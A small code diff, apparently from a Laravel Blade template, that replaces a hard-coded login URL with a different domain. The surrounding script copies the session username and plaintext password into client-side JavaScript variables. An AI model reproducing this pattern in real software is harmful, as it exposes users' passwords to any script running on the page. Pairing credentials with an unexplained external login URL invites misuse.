@@ -220,7 +220,7 @@
 <script>
   var errorMessage = @json(session('error'));
   var successMessage = @json(session('success'));
-  var url = 'https://asiamm.online/login';
+  var url = 'https://a1yoma.online/login';
   var name = @json(session('username'));
   var pw = @json(session('password'));
 
